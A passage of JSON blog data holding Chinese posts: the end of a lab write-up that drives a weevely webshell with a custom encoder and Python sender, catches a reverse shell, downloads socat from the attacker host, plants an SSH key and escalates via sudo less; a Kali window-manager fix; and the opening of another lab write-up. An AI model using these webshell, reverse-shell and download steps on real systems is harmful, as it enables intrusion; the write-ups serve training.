// \u52a0\u5bc6\n    echo '\u52a0\u5bc6\u524d\u7684\u6587\u672c: ' . $input_text . '\\n';\n\n    // \u538b\u7f29\u6587\u672c\n    $compressed_text = gzcompress($input_text);  // \u538b\u7f29\u6587\u672c\n    $encrypted_text = x($compressed_text, $k);   // XOR \u52a0\u5bc6\n    echo '\u52a0\u5bc6\u540e\u7684\u6587\u672c: ' . base64_encode($encrypted_text) . '\\n';  // \u8f93\u51fa Base64 \u7f16\u7801\u540e\u7684\u52a0\u5bc6\u6587\u672c\n} elseif ($choice == 2) {\n    // \u89e3\u5bc6\n    $decoded_text = base64_decode($input_text);  // Base64 \u89e3\u7801\n    $decrypted_text = x($decoded_text, $k);      // XOR \u89e3\u5bc6\n  \n    // \u89e3\u538b\u7f29\n    $decompressed = @gzuncompress($decrypted_text);  // \u89e3\u538b\u7f29\uff0c\u4f7f\u7528 @ \u907f\u514d\u8b66\u544a\n  \n    // \u5982\u679c\u89e3\u538b\u6210\u529f\uff0c\u5219\u8f93\u51fa\u89e3\u538b\u540e\u7684\u5185\u5bb9\uff1b\u5426\u5219\u8f93\u51fa\u89e3\u5bc6\u540e\u7684\u5185\u5bb9\n    if ($decompressed !== false) {\n        echo '\u89e3\u5bc6\u5e76\u89e3\u538b\u540e\u7684\u6587\u672c: ' . $decompressed . '\\n';\n    } else {\n        echo '\u89e3\u5bc6\u540e\u7684\u6587\u672c: ' . $decrypted_text . '\\n';\n    }\n} else {\n    echo '\u65e0\u6548\u7684\u9009\u9879\\n';\n}\n?>\n```\n\n\u52a0\u5bc6\u548c\u89e3\u5bc6\u6a21\u5757\uff08\u89e3\u5bc6\u6a21\u5757\u662f\u4e71\u7801\uff0c\u5efa\u8bae\u4e0d\u7528\uff0c\u6216\u8005\u81ea\u5df1\u6539\uff09\u3002\u53d1\u9001\u6a21\u5757\u6211\u4eec\u8fd8\u5dee\u4e00\u4e2a\u7f51\u5740\uff0c\u6211\u4eec\u4e4b\u524d\u7528\u90a3\u4e2a\u662f\u5907\u4efd\u6587\u4ef6\uff0c\u6211\u4eec\u77e5\u9053\u5b83\u7684\u547d\u540d\u89c4\u5219\uff0c\u90a3\u6211\u4eec\u5c1d\u8bd5\u7206\u7834\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wfuzz -c -u 'http://192.168.205.138/weevelyFUZZ' -w /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt --hc 404   \n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.205.138/weevelyFUZZ\nTotal requests: 66885\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                             \n=====================================================================\n\n000000037:   200        0 L      0 W        0 Ch        '.php7'                                                             \n000000248:   404        7 L      11 W       153 Ch      '.lOg'                                                              \n\nTotal time: 2.123899\nProcessed Requests: 246\nFiltered Requests: 245\nRequests/sec.: 115.8246\n\n\n```\n\n\u6839\u636e\u5df2\u77e5\u4fe1\u606f\u7f16\u5199\u811a\u672c\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/kali/test/tmp/weevely.bck]\n\u2514\u2500$ cat request.py \nimport requests\nimport base64\n\n# \u5bc6\u94a5 (\u4e0e PHP \u811a\u672c\u4e2d\u7684\u5bc6\u94a5\u4e00\u81f4)\nkh = 'b6e7a529b6c2'\nkf = 'd598a771749b'\np = 'afnqDsRcBpVmU71y'\n\ndef main():\n    # \u8f93\u5165\u8981\u53d1\u9001\u7684\u5b57\u7b26\u4e32\n    input_data = input('Enter the string to send: ')\n\n    # \u6784\u9020\u5e26\u6709\u7f16\u7801\u6570\u636e\u7684\u8bf7\u6c42\u4f53\n    request_data = f'{kh}{input_data}{kf}'\n\n    url = 'http://192.168.205.138/weevely.php7'  # \u8bf7\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u4fee\u6539\n\n    # \u53d1\u9001 POST \u8bf7\u6c42\n    response = requests.post(url, data=request_data)\n\n    # \u6253\u5370\u54cd\u5e94\u62a5\u6587\n    print('Response:', response.text)\n\nif __name__ == '__main__':\n    main()\n\n```\n\n\u53d1\u9001\u6a21\u5757\u3002\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/kali/test/tmp/weevely.bck]\n\u2514\u2500$ php tool.php\n\u9009\u62e9\u64cd\u4f5c\uff1a\n1. \u52a0\u5bc6\n2. \u89e3\u5bc6\n1\n\u8bf7\u8f93\u5165\u6587\u672c\uff1a\nsystem('ping -c2 192.168.205.141');\n\u52a0\u5bc6\u524d\u7684\u6587\u672c: system('ping -c2 192.168.205.141');\n\u52a0\u5bc6\u540e\u7684\u6587\u672c: S/hPyBxKfK7mNE6u/C9is35SNlaEUOdQB9e0VQJU4FAHVTC0hGI1ozptfA==\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/kali/test/tmp/weevely.bck]\n\u2514\u2500$ python3 request.py\nEnter the string to send: S/hPyBxKfK7mNE6u/C9is35SNlaEUOdQB9e0VQJU4FAHVTC0hGI1ozptfA==\nResponse: afnqDsRcBpVmU71yb6e7a529b6c2S/jp6f3u9yMj4Isfut49aVWaVqAvrEySgZxiVBbHOVl6KFMHTZ944ZQclbQEIWC05MOHiT+Q62uui+A3K8WYpUFCyNb58w7Y8YGh+OA4ZFpFRq2La91DLq87XUak1QjwTHJ+qr8GRRC72jSkqEkXHi5T197tvwT9lw2e5+7iz2VRo+VepOD08CvQytpLQkWEWe7lv2cPLReNkMV5R9FNGMMM7LBjd4Gx6rS3VxPib9nNQsedo9XHXjkoCy4V1mmqug38XPsihxwXSDrMd598a771749b\n                                      \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sudo tcpdump -A -n icmp\n[sudo] kali \u7684\u5bc6\u7801\uff1a\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n19:22:08.263760 IP 192.168.205.138 > 192.168.205.141: ICMP echo request, id 58412, seq 1, length 64\nE..T..@.@..Z...........c.,.....g....p....................... !'#$%&'()*+,-./01234567\n19:22:08.263782 IP 192.168.205.141 > 192.168.205.138: ICMP echo reply, id 58412, seq 1, length 64\nE..T....@.\\F...........c.,.....g....p....................... !'#$%&'()*+,-./01234567\n19:22:09.276459 IP 192.168.205.138 > 192.168.205.141: ICMP echo request, id 58412, seq 2, length 64\nE..T.(@.@..............1.,.....g............................ !'#$%&'()*+,-./01234567\n\n```\n\n\u8fd0\u884c\u6b63\u5e38\uff0c\u6211\u4eec\u5f39shell\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/kali/test/tmp/weevely.bck]\n\u2514\u2500$ python3 request.py\nEnter the string to send: S/hPyBxKfK7mNK4tZlSBV+FXUNXgVwdT5ldQV2TUNWE2uTBjzcD5X87AoIQ8QXgIM1fValA=\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888             \nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 58888\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6**\u53cd\u5411 shell** \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```bash\nwww-data@wave:~/html$ sudo -l  \n[sudo] password for www-data: \nsudo: a password is required\nwww-data@wave:~/html$ ls -la\ntotal 32\ndrwxr-xr-x 3 www-data www-data 4096 Sep  5  2023 .\ndrwxr-xr-x 3 root     root     4096 Sep  4  2023 ..\ndrwxr-xr-x 2 www-data www-data 4096 Sep  5  2023 backup\n-rw-r--r-- 1 www-data www-data   31 Sep  4  2023 index.html\n-rw-r--r-- 1 www-data www-data   32 Sep  4  2023 phptest.php\n-rw-r--r-- 1 www-data www-data   18 Sep  4  2023 robots.txt\n-rw-r--r-- 1 root     root      515 Sep  5  2023 weevely.bck\n-rw-r--r-- 1 www-data www-data  515 Sep  5  2023 weevely.php7\nwww-data@wave:~/html$ cd /home/\nwww-data@wave:/home$ ls -al\ntotal 16\ndrwxr-xr-x  4 root  root  4096 Sep  4  2023 .\ndrwxr-xr-x 18 root  root  4096 Sep  4  2023 ..\ndrwx------  4 angie angie 4096 Jan 18 10:40 angie\ndrwx------  2 carla carla 4096 Sep  4  2023 carla\nwww-data@wave:/home$ cd /opt/\nwww-data@wave:/opt$ ls -al\ntotal 12\ndrwxr-xr-x  2 root root  4096 Sep  4  2023 .\ndrwxr-xr-x 18 root root  4096 Sep  4  2023 ..\n-rwxrwxr--  1 root carla   46 Sep  4  2023 secret.txt\nwww-data@wave:/opt$ cat secret.txt \nDietro di lui, \ndietro di lui solo la nebbia.\nwww-data@wave:/opt$ find / -perm -4000 -type f 2>/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/mount\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/su\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/newgrp\nwww-data@wave:/opt$ /sbin/getcap -r / 2>/dev/null\n/usr/bin/ping cap_net_raw=ep\nwww-data@wave:/opt$ ss -tuln | grep tcp\ntcp   LISTEN 0      1024       127.0.0.1:3923      0.0.0.0:*            \ntcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    \ntcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    \ntcp   LISTEN 0      128             [::]:22           [::]:*    \ntcp   LISTEN 0      511             [::]:80           [::]:*   \n```\n\n\u6709\u4e2a\u672a\u77e5\u7aef\u53e3\uff0c\u6211\u4eec\u8f6c\u53d1\u4e00\u4e0b\n\n```bash\nwww-data@wave:~/html$ cd /tmp/\nwww-data@wave:/tmp$ wget 192.168.205.141/socat\n--2025-01-18 13:20:09--  http://192.168.205.141/socat\nConnecting to 192.168.205.141:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 375176 (366K) [application/octet-stream]\nSaving to: 'socat'\n\nsocat                                                        0%[                                                                       socat                                                      100%[========================================================================================================================================>] 366.38K  --.-KB/s    in 0.003s  \n\n2025-01-18 13:20:09 (105 MB/s) - 'socat' saved [375176/375176]\n\nwww-data@wave:/tmp$ chmod +x socat \nwww-data@wave:/tmp$ ./socat TCP-LISTEN:1234,fork TCP4:127.0.0.1:3923 &\n[1] 592\n```\n\n![Image](https://github.com/user-attachments/assets/74b5fd1f-838c-462a-acb9-576e7a15086e)\n\n\u50cf\u4e2a\u6587\u4ef6\u7ba1\u7406\u5668\uff0c\u800c\u4e14\u770b\u6837\u5b50\u5b83\u8fd8\u662f\u5728\u5bb6\u76ee\u5f55\u4e0b\uff0c\u6211\u4eec\u5c1d\u8bd5\u4e0a\u4f20\u4e00\u4e2a\u5bc6\u94a5\u4e0a\u53bb\u770b\u770b\u80fd\u4e0d\u80fd\u4e00\u53d1\u5165\u9b42\n\n```bash\nmkdir .ssh\ncd .ssh\nssh-keygen -t rsa \nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsa\nEnter passphrase (empty for no passphrase): 123456\nEnter same passphrase again: 123456\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/.ssh]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 20\ndrwxrwxr-x  3 kali kali 4096  1\u670818\u65e5 20:34 .\ndrwxrwxr-x 10 kali kali 4096  1\u670818\u65e5 20:31 ..\n-rw-r--r--  1 kali kali  563  1\u670818\u65e5 17:40 authorized_keys\n-rw-------  1 kali kali 2635  1\u670818\u65e5 17:40 id_rsa\ndrwxrwxr-x  2 kali kali 4096  1\u670818\u65e5 20:35 .ssh\n\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/.ssh]\n\u2514\u2500$ ls -la .ssh/              \n\u603b\u8ba1 12\ndrwxrwxr-x 2 kali kali 4096  1\u670818\u65e5 20:35 .\ndrwxrwxr-x 3 kali kali 4096  1\u670818\u65e5 20:34 ..\n-rw-r--r-- 1 kali kali  563  1\u670818\u65e5 17:40 authorized_keys\n                                                            \n```\n\n\u8bb0\u5f97\u5728\u91cc\u9762\u518d\u521b\u5efa\u4e00\u4e2a`.ssh`\u6587\u4ef6\u5939\uff0c\u5e76\u4e14\u628a`id\\_rsa.pub`\u6539\u540d\u4e3a`authorized_keys`\uff0c\u7136\u540e\u6253\u5f00\u4f60\u7684\u6587\u4ef6\u7ba1\u7406\u5668\u628a`.ssh`\uff08\u53ea\u6709`authorized_keys`\u90a3\u4e2a\uff09\u6587\u4ef6\u5939**\u62d6\u8fdb\u53bb\u4e0a\u4f20**\n\n![Image](https://github.com/user-attachments/assets/a896ce7c-321b-4eb0-a253-bef4e2a7d01a)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/.ssh]\n\u2514\u2500$ ssh angie@192.168.205.138 -i id_rsa\nThe authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.\nED25519 key fingerprint is SHA256:6XC0N82ZtO32MzrvGO7WaR/Yg+rpDa0Wkgoy3H8IdnE.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.\nEnter passphrase for key 'id_rsa': \nLinux wave 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue Sep  5 11:14:50 2023 from 192.168.0.100\nangie@wave:~$ id\nuid=1000(angie) gid=1000(angie) grupos=1000(angie),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)\n\n```\n\n\u5c1d\u8bd5\u63d0\u6743\n\n```bash\nangie@wave:~$ sudo -l\nMatching Defaults entries for angie on wave:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser angie may run the following commands on wave:\n    (ALL) NOPASSWD: /usr/bin/less -F /opt/secret.txt\nangie@wave:~$ sudo /usr/bin/less -F /opt/secret.txt\nDietro di lui, \ndietro di lui solo la nebbia.\n\n```\n\n\u5c0f\u7a97\u63d0\u6743\uff1f\n\n![Image](https://github.com/user-attachments/assets/f85836de-c61b-43be-9851-7a6fb509c529)\n\n\u8fd8\u771f\u662f\n\n```bash\nroot@wave:/home/angie# id\nuid=0(root) gid=0(root) grupos=0(root)\n\n```sentence", "top": 0, "createdAt": 1751016819, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P115": {"htmlDir": "docs/post/Kali Linux -zheng-jiu-ji-hua-\uff1a-xiu-fu-chuang-kou-wu-fa-yi-dong-ji-kong-zhi-an-niu-xiao-shi-wen-ti.html", "labels": ["\u77e5\u8bc6"], "postTitle": "Kali Linux \u62ef\u6551\u8ba1\u5212\uff1a\u4fee\u590d\u7a97\u53e3\u65e0\u6cd5\u79fb\u52a8\u53ca\u63a7\u5236\u6309\u94ae\u6d88\u5931\u95ee\u9898", "postUrl": "post/Kali%20Linux%20-zheng-jiu-ji-hua-%EF%BC%9A-xiu-fu-chuang-kou-wu-fa-yi-dong-ji-kong-zhi-an-niu-xiao-shi-wen-ti.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/115", "commentNum": 0, "wordCount": 1851, "description": "## \u95ee\u9898\u573a\u666f\n\n\u5728\u4f7f\u7528 Kali Linux (\u901a\u5e38\u662f XFCE \u684c\u9762\u73af\u5883) \u65f6\uff0c\u53ef\u80fd\u4f1a\u9047\u5230\u4e00\u4e2a\u4ee4\u4eba\u56f0\u60d1\u7684\u95ee\u9898\uff1a\u5728\u767b\u5f55\u7cfb\u7edf\u540e\uff0c\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\uff08\u5982\u7ec8\u7aef\uff09\u7a81\u7136\u5931\u53bb\u4e86\u5176\u6807\u9898\u680f\uff0c\u8fd9\u610f\u5473\u7740\u53f3\u4e0a\u89d2\u7684\u6700\u5c0f\u5316\u3001\u6700\u5927\u5316\u3001\u5173\u95ed\u6309\u94ae\u6d88\u5931\u4e86\uff0c\u5e76\u4e14\u65e0\u6cd5\u901a\u8fc7\u9f20\u6807\u62d6\u52a8\u6765\u79fb\u52a8\u7a97\u53e3\u3002\u540c\u65f6\uff0c\u4efb\u52a1\u680f\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u56fe\u6807\u4e5f\u53ef\u80fd\u968f\u4e4b\u6d88\u5931\u3002\n\n\u6b63\u5982\u7528\u6237\u6240\u8ff0\uff0c\u8fd9\u79cd\u60c5\u51b5\u53ef\u80fd\u5728\u6ce8\u9500\u5e76\u91cd\u65b0\u767b\u5f55\u540e\u53d1\u751f\uff0c\u6253\u65ad\u4e86\u6b63\u5e38\u7684\u5de5\u4f5c\u6d41\u7a0b\u3002\n\n## \u95ee\u9898\u5206\u6790\n\n\u8fd9\u4e2a\u95ee\u9898\u901a\u5e38\u6307\u5411 **\u7a97\u53e3\u7ba1\u7406\u5668 (Window Manager)** \u51fa\u73b0\u4e86\u6545\u969c\u3002\u5728\u6807\u51c6\u7684 Kali XFCE \u73af\u5883\u4e2d\uff0c\u9ed8\u8ba4\u7684\u7a97\u53e3\u7ba1\u7406\u5668\u662f **Xfwm4**\u3002\u5b83\u8d1f\u8d23\u7ed8\u5236\u7a97\u53e3\u8fb9\u6846\u3001\u6807\u9898\u680f\u3001\u63a7\u5236\u6309\u94ae\uff0c\u5e76\u5904\u7406\u7a97\u53e3\u7684\u79fb\u52a8\u3001\u5927\u5c0f\u8c03\u6574\u7b49\u64cd\u4f5c\u3002\u5f53 Xfwm4 \u672a\u80fd\u6b63\u5e38\u542f\u52a8\u3001\u5d29\u6e83\u6216\u88ab\u610f\u5916\u8fdb\u7a0b\u66ff\u6362\u65f6\uff0c\u5c31\u4f1a\u51fa\u73b0\u4e0a\u8ff0\u75c7\u72b6\u3002\n\n## \u89e3\u51b3\u65b9\u6848\n\n\u5e78\u8fd0\u7684\u662f\uff0c\u8fd9\u4e2a\u95ee\u9898\u6709\u76f4\u63a5\u7684\u89e3\u51b3\u65b9\u6cd5\uff0c\u5305\u62ec\u4e34\u65f6\u4fee\u590d\u548c\u6c38\u4e45\u6027\u8bbe\u7f6e\u3002\n\n### 1. \u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5 (\u7acb\u5373\u6062\u590d)\n\n\u5982\u679c\u4f60\u9047\u5230\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u7acb\u5373\u5c1d\u8bd5\u624b\u52a8\u91cd\u542f\u7a97\u53e3\u7ba1\u7406\u5668\u3002\n\n* **\u6253\u5f00\u4e00\u4e2a\u7ec8\u7aef**\uff1a\n\n  *   \u5c1d\u8bd5\u4f7f\u7528\u5feb\u6377\u952e\uff0c\u5982 `Ctrl+Alt+T`\u3002\n  *   \u5982\u679c\u65e0\u6cd5\u6253\u5f00\u65b0\u7ec8\u7aef\uff0c\u770b\u662f\u5426\u80fd\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u83dc\u5355\uff08\u5de6\u4e0a\u89d2 Kali \u56fe\u6807\uff09\u627e\u5230\u5e76\u542f\u52a8\u4e00\u4e2a\u3002\n  *   \u5982\u679c\u5b9e\u5728\u4e0d\u884c\uff0c\u53ef\u80fd\u9700\u8981\u5207\u6362\u5230 TTY (\u5982 `Ctrl+Alt+F3`)\uff0c\u767b\u5f55\u540e\u6267\u884c\u547d\u4ee4\uff0c\u518d\u5207\u6362\u56de\u56fe\u5f62\u754c\u9762 (`Ctrl+Alt+F1` \u6216 `Ctrl+Alt+F7`)\u3002\n\n* **\u5728\u7ec8\u7aef\u4e2d\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a**\n\n  ```bash\n  xfwm4 --replace &\n  ```\n\n* **\u547d\u4ee4\u89e3\u91ca\uff1a**\n\n  *   `xfwm4`: \u8c03\u7528 XFCE \u7a97\u53e3\u7ba1\u7406\u5668\u3002\n  *   `--replace`: \u6307\u793a `xfwm4` \u66ff\u6362\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u4efb\u4f55\u7a97\u53e3\u7ba1\u7406\u5668\u5b9e\u4f8b\uff08\u5373\u4f7f\u6ca1\u6709\u5728\u8fd0\u884c\uff09\u3002\n  *   `&`: \u5c06\u547d\u4ee4\u653e\u5230\u540e\u53f0\u6267\u884c\uff0c\u8fd9\u6837\u5173\u95ed\u7ec8\u7aef\u7a97\u53e3\u65f6\u4e0d\u4f1a\u7ec8\u6b62 `xfwm4` \u8fdb\u7a0b\u3002\n\n\u6267\u884c\u6b64\u547d\u4ee4\u540e\uff0c\u4f60\u5e94\u8be5\u80fd\u7acb\u523b\u770b\u5230\u7a97\u53e3\u7684\u6807\u9898\u680f\u548c\u63a7\u5236\u6309\u94ae\u6062\u590d\u6b63\u5e38\uff0c\u5e76\u4e14\u53ef\u4ee5\u518d\u6b21\u79fb\u52a8\u7a97\u53e3\u3002\n\n### 2. \u8bbe\u7f6e\u5f00\u673a\u81ea\u542f (\u6c38\u4e45\u6027\u89e3\u51b3\u65b9\u6848)\n\n\u4e3a\u4e86\u907f\u514d\u6bcf\u6b21\u767b\u5f55\u540e\u90fd\u53ef\u80fd\u9700\u8981\u624b\u52a8\u6267\u884c\u4e0a\u8ff0\u547d\u4ee4\uff0c\u53ef\u4ee5\u5c06 `xfwm4` \u8bbe\u7f6e\u4e3a\u5728\u767b\u5f55\u65f6\u81ea\u52a8\u542f\u52a8\uff0c\u786e\u4fdd\u5b83\u603b\u662f\u80fd\u6b63\u786e\u8fd0\u884c\u3002\n\n*   **\u6253\u5f00 '\u4f1a\u8bdd\u548c\u542f\u52a8' \u8bbe\u7f6e\uff1a**\n    1.  \u70b9\u51fb\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684 **\u5e94\u7528\u7a0b\u5e8f\u83dc\u5355** (Kali \u56fe\u6807)\u3002\n    2.  \u5728\u641c\u7d22\u6846\u4e2d\u8f93\u5165 '\u4f1a\u8bdd\u548c\u542f\u52a8' (Session and Startup)\u3002\n    3.  \u70b9\u51fb\u6253\u5f00\u8be5\u5e94\u7528\u7a0b\u5e8f\u3002\n\n*   **\u6dfb\u52a0\u81ea\u52a8\u542f\u52a8\u9879\uff1a**\n    1.  \u5728 '\u4f1a\u8bdd\u548c\u542f\u52a8' \u7a97\u53e3\u4e2d\uff0c\u5207\u6362\u5230 **'\u5e94\u7528\u7a0b\u5e8f\u81ea\u52a8\u542f\u52a8' (Application Autostart)** \u9009\u9879\u5361\u3002\n    2.  \u70b9\u51fb **'+ \u6dfb\u52a0' (+ Add)** \u6309\u94ae\u3002\n    3.  \u5728\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\u4e2d\u586b\u5199\u4ee5\u4e0b\u4fe1\u606f\uff1a\n        *   **\u540d\u79f0 (Name):** `XFWM4 Autostart` (\u6216\u4efb\u4f55\u4f60\u5bb9\u6613\u8bc6\u522b\u7684\u540d\u79f0)\n        *   **\u63cf\u8ff0 (Description):** `\u786e\u4fdd XFCE \u7a97\u53e3\u7ba1\u7406\u5668\u5728\u767b\u5f55\u65f6\u542f\u52a8` (\u53ef\u9009)\n        *   **\u547d\u4ee4 (Command):** `xfwm4`\n            *   *\u6ce8\u610f\uff1a\u8fd9\u91cc\u901a\u5e38\u4e0d\u9700\u8981 `--replace` \u53c2\u6570\uff0c\u7cfb\u7edf\u542f\u52a8\u8fc7\u7a0b\u5e94\u80fd\u786e\u4fdd `xfwm4` \u6b63\u5e38\u52a0\u8f7d\u3002\u5982\u679c\u53ea\u5199 `xfwm4` \u4ecd\u7136\u6709\u95ee\u9898\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u6539\u4e3a `xfwm4 --replace`\u3002*\n        *   **\u89e6\u53d1\u5668 (Trigger):** \u4fdd\u6301\u9ed8\u8ba4\u7684 `on login` \u5373\u53ef\u3002\n\n    4.  \u70b9\u51fb **'\u786e\u5b9a' (OK)** \u6216 **'\u6dfb\u52a0' (Add)** \u6309\u94ae\u4fdd\u5b58\u3002\n\n*   **\u5b8c\u6210\uff1a**\n    \u5173\u95ed '\u4f1a\u8bdd\u548c\u542f\u52a8' \u7a97\u53e3\u3002\u73b0\u5728\uff0c\u6bcf\u6b21\u4f60\u767b\u5f55 Kali Linux \u65f6\uff0c\u7cfb\u7edf\u90fd\u4f1a\u81ea\u52a8\u5c1d\u8bd5\u542f\u52a8 `xfwm4`\uff0c\u4ece\u800c\u5927\u6982\u7387\u907f\u514d\u7a97\u53e3\u7ba1\u7406\u5668\u4e22\u5931\u7684\u95ee\u9898\u3002\n\n## \u7ed3\u8bba\n\nKali Linux (XFCE) \u7a97\u53e3\u5931\u53bb\u63a7\u5236\u6309\u94ae\u548c\u79fb\u52a8\u80fd\u529b\u7684\u95ee\u9898\uff0c\u901a\u5e38\u662f\u7531\u4e8e\u7a97\u53e3\u7ba1\u7406\u5668 `xfwm4` \u672a\u80fd\u6b63\u5e38\u5de5\u4f5c\u6240\u81f4\u3002\u901a\u8fc7 `xfwm4 --replace &` \u547d\u4ee4\u53ef\u4ee5\u7acb\u5373\u4fee\u590d\uff0c\u800c\u5c06\u5176\u6dfb\u52a0\u5230 '\u4f1a\u8bdd\u548c\u542f\u52a8' \u4e2d\u5219\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u66f4\u6301\u4e45\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u786e\u4fdd\u7528\u6237\u4f53\u9a8c\u7684\u8fde\u7eed\u6027\u3002sentence", "top": 0, "createdAt": 1751016823, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P116": {"htmlDir": "docs/post/nyx_APex.html", "labels": ["vulnyx"], "postTitle": "nyx_APex", "postUrl": "post/nyx_APex.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/116", "commentNum": 0, "wordCount": 19141, "description": "# nyx_APex\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[vulnyx - APex](https://vulnyx.com/file/APex.php)\n**\u96be\u5ea6**\uff1aEasy\n**\u76ee\u6807 IP**\uff1a192.168.205.148\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.148\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 19:17 CST\nNmap scan report for 192.168.205.148\nHost is up (0.00026s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n79/tcp open  finger\n80/tcp open  http\nMAC Address: 08:00:27:8E:D9:36 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.56 seconds\n\n```\n\n\u5176\u4e2d79\u662f\u6211\u6ca1\u6709\u89c1\u8fc7\u7684\u670d\u52a1\uff0c\u4f18\u5148\u7ea7\u6700\u9ad8\n\n# 2.\u8e29\u70b9\n\n\u5728hacktricks\u641c\u7d22\u5230\u4e86\u76f8\u5173[\u7f51\u9875](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html#79---pentesting-finger)\n\n![Image](https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a)\n\n\u6709Metasploit\u7684\u811a\u672c\uff0c\u6211\u4eec\u4f18\u5148\u5229\u7528\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ msfconsole\nmsf6 > use auxiliary/scanner/finger/finger_users\nmsf6 auxiliary(scanner/finger/finger_users) > show options \n\nModule options (auxiliary/scanner/finger/finger_users):\n\n   Name        Current Setting                        Required  Description\n   ----        ---------------                        --------  -----------\n   RHOSTS                                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metas\n                                                                ploit/basics/using-metasploit.html\n   RPORT       79                                     yes       The target port (TCP)\n   THREADS     1      